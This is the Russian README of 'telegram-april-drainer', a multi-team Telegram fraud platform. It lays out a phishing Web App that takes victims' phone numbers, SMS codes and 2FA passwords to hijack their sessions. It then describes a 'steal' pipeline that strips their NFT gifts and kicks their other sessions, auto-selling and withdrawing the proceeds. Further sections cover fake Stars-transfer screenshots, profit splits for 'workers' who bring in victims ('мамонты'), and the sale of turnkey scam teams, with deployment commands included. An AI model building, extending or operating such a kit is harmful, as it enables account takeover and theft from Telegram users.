[EN](../README.md) | RU

## telegram-april-drainer 📦

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)


**telegram-april-drainer** - мульти-тенантная Telegram-платформа с авторегом команд, маркетплейс-снайпером, отрисовкой чеков, веб-админкой и полным продакшн-стеком.

Не «один бот» - это **фабрика команд**: каждая тима получает свой порт, nginx-location, config, storage, бот и Web App. Autocraft регистрирует новую тиму за минуту. Supervisor держит всё живым. Receiver poll снайпит листинги на Tonnel.

**Версия ядра:** 4.0.0

> Архив очищен от секретов. Перед запуском: `config.example.py` → `config.py`, `.env.example` → `.env`, `scripts/bootstrap_env.py --write`.

---

## 📑 Оглавление

- [Почему это круто](#-почему-это-круто)
- [Архитектура](#-архитектура)
- [Система тим](#-система-тим)
- [Autocraft - авторег тим](#-autocraft---авторег-тим)
- [Снайпер и receiver poll](#-снайпер-и-receiver-poll)
- [Чеки и отрисовка](#-чеки-и-отрисовка)
- [Админка](#-админка)
- [Бот и воркеры](#-бот-и-воркеры)
- [Web App и d0sh1k](#-web-app-и-d0sh1k)
- [Мониторинг и checker](#-мониторинг-и-checker)
- [Быстрый старт](#-быстрый-старт)
- [Структура репозитория](#-структура-репозитория)
- [Безопасность](#-безопасность)

---

## ✨ Почему это круто

| Фича | Что делает |
|------|------------|
| **Мульти-тима** | N команд на одном сервере, изолированные config + storage + порты |
| **Авторег** | Покупка токена → имя → готовая тима с nginx и supervisor |
| **Снайпер** | Автолистинг NFT, relist по ступеням цены, отслеживание sold, профит воркеру |
| **Чеки** | Inline `100 @user`, мультичеки, fake-скрины перевода Stars через PIL |
| **Админка** | `/{team}/admin` - config, сессии, профиты, прокси, product mode |
| **Product mode** | `checks` / `marker` - разные сценарии продукта на тиму |
| **Рефералка** | Отдельный referral-web на свой порт + лендинг с Telegram Login Widget |
| **Supervisor** | Health-check, autostart bot/web, проверка `getMe` токена |
| **Checker** | Кросс-тимовый watchdog + дневная статистика в Telegram |

---

## 🏗️ Архитектура

```mermaid
flowchart TB
    subgraph clients [Клиенты]
        USER[Пользователь TG]
        WORKER[Воркер]
        ADMIN[Админ]
        BUYER[Покупатель тимы]
    end

    subgraph edge [Edge]
        NGINX[nginx]
    end

    subgraph platform [Platform layer]
        AC[autocraft API + SPA]
        AC_BOT[autocraft bot]
        MON[server-monitor]
        CHECKER[checker.py]
    end

    subgraph teamA [Team goodteam]
        WEB_A[web.py :37018]
        BOT_A[bot.py]
        REF_A[web_referral.py :37019]
        CFG_A[config.py + storage/]
    end

    subgraph teamB [Team ...]
        WEB_B[web.py :37xxx]
        BOT_B[bot.py]
    end

    subgraph workers [Background workers]
        SUP[teams_supervisor]
        REC[receiver_poll]
        TONNEL[Tonnel / Fragment API]
    end

    subgraph ui [UI]
        D0SH[d0sh1k Node WebApp]
        ADMIN_UI["/{team}/admin"]
    end

    BUYER --> AC
    AC -->|provision_team| teamA
    AC -->|nginx include| NGINX

    USER --> NGINX
    WORKER --> BOT_A
    ADMIN --> ADMIN_UI

    NGINX --> WEB_A
    NGINX --> REF_A
    NGINX --> AC
    NGINX --> MON
    NGINX --> D0SH

    WEB_A --> CFG_A
    BOT_A --> CFG_A
    SUP --> WEB_A
    SUP --> BOT_A
    SUP --> teamB

    REC --> TONNEL
    REC --> CFG_A
    CHECKER --> teamA
    CHECKER --> teamB
```

### Поток данных (упрощённо)

```mermaid
sequenceDiagram
    participant U as User
    participant W as Web App
    participant P as Pyrogram
    participant B as Bot
    participant G as Work Group
    participant R as receiver_poll

    U->>W: open Web App (initData)
    W->>W: verify_telegram_data()
    W->>P: phone → code → 2FA
    P->>W: session ready
    W->>G: drain log
    R->>R: list NFT on Tonnel
    R->>R: poll sold / relist
    R->>B: profit notify worker
    B->>G: payout thread
```

---

## 👥 Система тим

Каждая тима - **полностью автономный инстанс** в `teams/<slug>/`:

```
teams/goodteam/
├── config.py              # BOT_TOKEN, сессии, кошельки, thread IDs
├── service.json           # web_port, referral_web_port, health_url, autostart
├── config.example.py      # шаблон для новых тим
└── storage/
    ├── settings.json      # privacy, photos, gift_upgrades
    ├── procents.json      # коэффициенты и % воркеров
    ├── config.json        # product_mode: checks | marker
    ├── banned.json
    ├── reserve.json       # резервные bot token
    ├── 2fa.json           # runtime-кэш (в .gitignore)
    ├── *.db               # gois, profits, checks, listing_gifts
    └── avatar.png         # для /draw
```

### Context-aware routing

`paths.py` держит `TEAM_DIR` через `contextvars`:

- env `TEAM_DIR` - для одиночного запуска
- `TeamPathMiddleware` - для админки `https://host/goodteam/admin`
- `push_team_dir()` / `pop_team_dir()` - переключение на лету

Один код `code/`, десятки тим - без форков репозитория.

### service.json

```json
{
  "web_port": 37018,
  "referral_web_port": 37019,
  "web_host": "127.0.0.1",
  "health_url": "http://127.0.0.1:37018/",
  "check_interval_sec": 30,
  "autostart_bot": true
}
```

Supervisor читает этот файл и поднимает `web.py` + `bot.py` на нужных портах.

### Nginx per team

Autocraft пишет include-файлы:

```
autocraft/nginx-generated/
├── fragment/goodteam.conf    # proxy_pass → web_port
└── referral/goodteam.conf    # proxy_pass → referral_web_port
```

Публичный URL: `https://1.fragmentapi.online/goodteam/`

---

## ⚙️ Autocraft - авторег тим

**Autocraft** - control plane всего стека. React-фронт + FastAPI backend.

### Регистрация новой тимы

```mermaid
sequenceDiagram
    participant A as Admin
    participant AC as autocraft API
    participant DB as SQLite
    participant T as teams/test template
    participant N as nginx

    A->>AC: POST /api/internal/tokens
    AC->>DB: create 16-char token
    AC-->>A: url /r/{token}

    Note over A: Покупатель открывает /r/{token}

    A->>AC: POST /api/register/finish
    Note right of A: team_name, password
    AC->>T: copytree → teams/{slug}
    AC->>AC: pick_free_port × 2
    AC->>AC: render config.py
    AC->>N: write fragment + referral conf
    AC->>AC: systemctl restart supervisor
    AC->>DB: mark token used
```

### Что делает `provision_team()`

1. Копирует `teams/test` (или `TEMPLATE_TEAM_SLUG`) в `teams/{slug}`
2. Чистит `storage/*.db` из шаблона
3. Генерирует `config.py`: `WEB_APP_LINK`, `SECRET_KEY` (пароль админки), пустые токены
4. Выделяет **два свободных порта** из диапазона `37000–37899`
5. Пишет `service.json`
6. Генерирует nginx snippets + `reload_host_nginx.sh`
7. Рестартит `teams_supervisor`

### API

| Endpoint | Описание |
|----------|----------|
| `POST /api/internal/tokens` | Создать одноразовый токен регистрации |
| `GET /api/register/status/{token}` | Токен валиден? |
| `POST /api/register/finish` | Завершить регистрацию (rate limit 8/min) |
| `GET /api/health` | Healthcheck |

Токены живут `TOKEN_TTL_HOURS`, одноразовые.

---

## 🎯 Снайпер и receiver poll

**`receiver_poll.py`** - фоновый воркер маркетплейса. Это и есть «снайпер»: автоматически выставляет подарки/NFT на Tonnel, следит за продажей, переливает цену, считает профит.

### Возможности

- **Автолистинг** - новые gifts из drain → on sale
- **Relist ladder** - мультипликаторы `0.9 → 0.8 → 0.7 → 0.6` (`RECEIVER_LIST_PRICE_MULTS`)
- **Floor tracking** - `gift_floor()` + `tonnel_floor_withdraw_loop.py`
- **Sold detection** - поллинг каждые `RECEIVER_POLL_INTERVAL_SEC`
- **Profit split** - привязка к `worker_id`, `profit_id`, `listing_gifts` в SQLite
- **DM воркеру** - `listing_price_pending` с inline-кнопками выбора цены
- **Auto-withdraw** - 78% баланса на кошелёк после продажи
- **Rate limit cooldown** - защита от Coffin API throttling

### Конфиг (env)

```bash
RECEIVER_POLL_ENABLED=1
RECEIVER_AUTO_SELL_ENABLED=0      # только поллинг vs полный автосейл
RECEIVER_POLL_INTERVAL_SEC=10
RECEIVER_LISTING_TTL_SEC=600
RECEIVER_LIST_PRICE_MULTS=0.9,0.8,0.7,0.6
RECEIVER_LIST_PRICE_FLOOR_MULT=0.6
RECEIVER_POLL_LOG_BOT_TOKEN=
RECEIVER_POLL_LOG_CHAT_ID=
```

### Связанные модули

| Файл | Роль |
|------|------|
| `listing_price_pending.py` | Pending-листинги + inline keyboard |
| `handlers/receiver_listing.py` | Callback выбора цены |
| `handlers/gift_list_price.py` | FSM установки цены воркером |
| `tonnel_withdraw_all.py` | Разовый вывод баланса |
| `tonnel_floor_withdraw_loop.py` | Цикл list → sell → withdraw по floor |
| `drainer/core/tonnel_api.py` | Coffin API, balance, list, cancel |

```mermaid
stateDiagram-v2
    [*] --> NewGift: drain получил NFT
    NewGift --> Listed: coffin_list_for_sale
    Listed --> Polling: receiver_poll tick
    Polling --> Sold: gift gone + price
    Polling --> Relist: TTL expired
    Relist --> Listed: price × mult
    Sold --> Profit: advanced_profits + notify
    Sold --> Withdraw: 78% → wallet
    Profit --> [*]
```

---

## 🧾 Чеки и отрисовка

Два режима продукта (`storage/config.json` → `product_mode`):

- **`checks`** - звёздные чеки (основной)
- **`marker`** - альтернативный сценарий

### Inline-чеки (воркер)

Воркер пишет в inline бота:

| Запрос | Результат |
|--------|-----------|
| `100 @username` | Чек на 100 ⭐️ для @username |
| `100 50` | Мультичек: 100 ⭐️ × 50 активаций |
| пустой | Реферальное приглашение |

Ограничения:
- мультичек только **50 / 100 / 500** ⭐️
- новые аккаунты - cooldown **21 день**
- проверка членства в `WORK_GROUP_ID`

Активация: `t.me/bot?start={check_id}_{worker_id}` → анимация «проверяю…» → Web App кошелёк.

### Отрисовка скринов - `draw.py`

PIL-рендер **fake-скрина перевода Stars** в стиле Telegram:

- фон `static/background.png`
- время устройства (Europe/Moscow)
- аватар воркера `teams/.../avatar.png`
- сумма Stars с зелёным `+ N`
- имя бота, дата транзакции

Команда воркера:

```
/draw 50
```

→ `generate_image()` → `send_photo` → удаление temp-файла.

Используется для визуала в чатах и логах.

### База чеков

```sql
checks       - id, stars, receiver, activated, worker_id
multichecks  - id, stars, activations, remaining
```

---

## 🛠️ Админка

**URL:** `https://host/{team}/admin`  
**Стек:** FastAPI + Jinja + WebGL-фон (shader в `admin.html`)

### Мульти-тимовый роутинг

`web_admin_app.py` → `TeamPathMiddleware`:

```
/goodteam/admin        → config goodteam
/test/admin            → config test
/goodteam/admin/api/…  → API с context TEAM_DIR
```

Cookie `pass` = SHA256(`SECRET_KEY`), path-scoped per team.

### Панели

| Раздел | Возможности |
|--------|-------------|
| **Config** | Редакт `config.py` из браузера, save + restart |
| **Product mode** | Переключение `checks` ↔ `marker` |
| **Reserve tokens** | Резервные BOT_TOKEN для ротации |
| **Sessions** | Скан `.session`, phone/2FA, kick, export string |
| **Profits** | Список, подтверждение, выплата, % воркеров |
| **Proxy** | Редакт `proxys.json`, смена активного |
| **Pyrofork** | Установка версии Pyrogram из админки |
| **Add session** | Импорт новой StringSession с 2FA |

### Telegram-админка (bot)

`handlers/admins.py` - зеркало для мобилы:

- `/admin` - главная панель
- `/sessions` - скан сессий с progress bar
- `/draw N` - отрисовка чека
- `/stat`, `/top`, `/profit` - аналитика
- inline: hide mamonts/workers, toggle photos, gift upgrades
- FSM: смена кошелька, коэффициентов, телефона, 2FA

---

## 🤖 Бот и воркеры

**aiogram 3** + **Pyrogram** в одном процессе.

### Роли

```mermaid
flowchart LR
    MAMONT[Мамонт] -->|/start check_| BOT
    WORKER[Воркер] -->|inline чек| BOT
    ADMIN[Админ] -->|/admin| BOT
    BOT --> DB[(SQLite)]
    BOT --> GROUP[Work Group threads]
```

### Потоки в группе

| Thread | Содержимое |
|--------|------------|
| `LOGS_THREAD_ID` | Логи мамонтов, чеки, мультичеки |
| `DRAINS_THREAD_ID` | Успешные drain |
| `PAYOUTS_THREAD_ID` | Выплаты воркерам |

### Воркер-фичи

- **Кошелёк / магазин / пополнение** - fake UI для Stars
- **Автоскупщик** - `autobuy` toggle, уведомление о новых gifts
- **Профиты** - `advanced_profits.db`, `/profit`, панель выплат
- **Приватность** - `privacy` / `worker_privacy` маскируют ID в логах
- **Рефералка** - `referral_invites`, `referral_visits`, invite chosen

### Drainer core

```
code/drainer/core/
├── steal.py              # главный пайплайн после логина
├── parse.py              # оценка NFT (xgift + proxy)
├── tonnel_api.py         # Coffin / Tonnel HTTP API
├── hybr1d_shared.py      # shared receiver session
├── kick_sessions.py      # сброс чужих сессий
├── post_connect_captcha.py
├── coffin_signing.py
└── functional.py         # mutate_text, obfuscation
```

---

## 🌐 Web App и d0sh1k
### `web.py` (FastAPI)

| Route | Описание |
|-------|----------|
| `/app` | Telegram Web App shell |
| `/code` | Ввод SMS-кода |
| `/password` | 2FA |
| `/deposit`, `/withdraw` | UI кошелька |
| `/api/...` | initData, session state |

Валидация `initData` через HMAC-SHA256 (`verify_telegram_data`).  
Cookie drain-flow с cooldown на ошибки (`ERROR_COOLDOWN_SECONDS`).

### `web_referral.py`

Отдельный процесс на `referral_web_port`:

- лендинг `referral_landing.html` с WebGL shader
- Telegram Login Widget verification
- трекинг `referral_visits` по `id{visitor}`

### `d0sh1k/`

Node.js bundle - альтернативный **чат-UI Web App** (`TELEGRAM_WEB_APP_URL`).  
Запускается как `opt-d0sh1k.service` в общем стеке.

---

## 📊 Мониторинг и checker
### `teams_supervisor.py`

- обходит все `teams/*/service.json`
- HTTP health на `health_url`
- проверяет `getMe` для `BOT_TOKEN`
- autostart / restart `web.py` + `bot.py`
- логи в `teams/{slug}/logs/`

### `checker.py`

- кросс-тимовый мониторинг процессов
- суточный профит из `advanced_profits.db`
- уведомление в 22:00 MSK (`CHECKER_NOTIFY_*`)
- reserve token health

### `server-monitor/`

FastAPI дашборд:

- CPU, RAM, disk, load average
- статусы systemd units стека
- login form (`MONITOR_USER` / `MONITOR_PASSWORD`)

---

## 🚀 Быстрый старт
### 1. Секреты

```bash
cp teams/goodteam/config.example.py teams/goodteam/config.py
# BOT_TOKEN, API_ID, API_HASH, SESSION_STRING, кошельки, ADMIN_ID



cp code/.env.example code/.env
cp autocraft/.env.example autocraft/.env
cp d0sh1k/.env.example d0sh1k/.env
cp server-monitor/env.sample server-monitor/.env

python3 scripts/bootstrap_env.py --write
```

### 2. Прокси

```bash
cp code/proxys.json.dist code/proxys.json
```

### 3. Одна тима (dev)

```bash
export TEAM_DIR="$(pwd)/teams/goodteam"
cd code
python3 -m venv .venv && .venv/bin/pip install -r requirements.txt

# web
.venv/bin/uvicorn web:app --host 127.0.0.1 --port 37018

# bot
.venv/bin/python bot.py

# admin (отдельный порт)
.venv/bin/uvicorn web_admin_app:app --host 127.0.0.1 --port 37021

# receiver poll
.venv/bin/python receiver_poll.py
```

### 4. Полный продакшн-стек

```bash
sudo deploy/install-ubuntu22.sh /opt
sudo systemctl restart opt-code-stack opt-autocraft-api opt-autocraft-bot opt-d0sh1k opt-server-monitor opt-receiver-poll
```

### 5. Новая тима через Autocraft

```bash
# создать токен (internal API key в заголовке)
curl -X POST http://127.0.0.1:9090/api/internal/tokens \
  -H "X-Internal-Key: $INTERNAL_API_KEY"

# покупатель: https://byy.example.com/r/{token}
# вводит имя + пароль → тима готова на /{slug}/
```

---

## 📁 Структура репозитория

```
.
├── code/                   # ядро: web, bot, drainer, receiver_poll, draw
│   ├── drainer/core/       # steal, tonnel, parse, hybr1d
│   ├── handlers/           # users, admins, gift_list_price, receiver_listing
│   ├── templates/          # web app, admin, referral landing
│   ├── draw.py             # PIL-отрисовка чеков
│   ├── database.py         # SQLite: gois, profits, checks, listing_gifts
│   ├── teams_supervisor.py # watchdog всех тим
│   ├── checker.py          # кросс-тим checker
│   ├── receiver_poll.py    # снайпер Tonnel
│   └── web_admin_app.py    # мульти-тимовая админка
│
├── teams/                  # инстансы команд
│   ├── goodteam/
│   └── test/               # шаблон для autocraft
│
├── autocraft/              # авторег + nginx + панель
│   ├── backend/            # provision, tokens, nginx_writer
│   ├── frontend/           # React SPA регистрации
│   └── bot/                # уведомления админам
│
├── d0sh1k/                 # Node Web App чат
├── server-monitor/         # метрики сервера
├── deploy/                 # install scripts, systemd, nginx
├── server-exports/         # снимок прод nginx/systemd
├── server-pull/            # бэкап-копия code/
└── scripts/
    ├── bootstrap_env.py    # генерация секретов
    └── ssh_http_connect.py
```

---

## ⚙️ Переменные окружения
### `teams/*/config.py`

| Поле | Назначение |
|------|------------|
| `BOT_TOKEN` | Telegram-бот тимы |
| `API_ID` / `API_HASH` | Pyrogram |
| `HYBR1D_SESSION_STRING` | Основная StringSession |
| `STAR_SESSION_STRING` | Stars / автозакид |
| `SECRET_KEY` | Пароль `/{team}/admin` |
| `WEB_APP_LINK` | Публичный URL Web App |
| `ADMIN_WALLET` / `OFFERS_WALLET` | TON |
| `WORK_GROUP_ID` + thread IDs | Логи в супергруппе |
| `REFERRAL_PUBLIC_BASE` | База referral-лендинга |

### `code/.env`

| Переменная | Назначение |
|------------|------------|
| `WEB_SESSION_SECRET` | Cookie web |
| `ADMIN_SESSION_SECRET` | Cookie админки |
| `HELPER_BOT_TOKEN` | Вспомогательный бот |
| `CHECKER_NOTIFY_*` | Checker уведомления |
| `XGIFT_PROXY` | Прокси для xgift price API |
| `WITHDRAW_WALLET` | Кошелёк tonnel withdraw |

### `autocraft/.env`

| Переменная | Назначение |
|------------|------------|
| `INTERNAL_API_KEY` | Защита internal API |
| `TEAMS_ROOT` / `CODE_ROOT` | Пути |
| `PORT_RANGE_MIN/MAX` | Диапазон портов |
| `TEMPLATE_TEAM_SLUG` | Шаблон (`test`) |
| `BUY_PUBLIC_BASE` | URL покупки тим |

---

## 🔒 Безопасность

- **Не коммить:** `.env`, заполненный `config.py`, `2fa.json`, `*.session`, логи
- Архив **очищен**: токены, сессии, прокси, кошельки, 2FA-пароли удалены
- Если старые секреты где-то остались - **ротируй всё**
- `server-exports/` - референс, не деплой без ревью
- `logs/` (~27 MB в goodteam) - только локально, в git не идут

---

## 📜 Лицензия

Архив для изучения и восстановления **собственной** инфраструктуры.
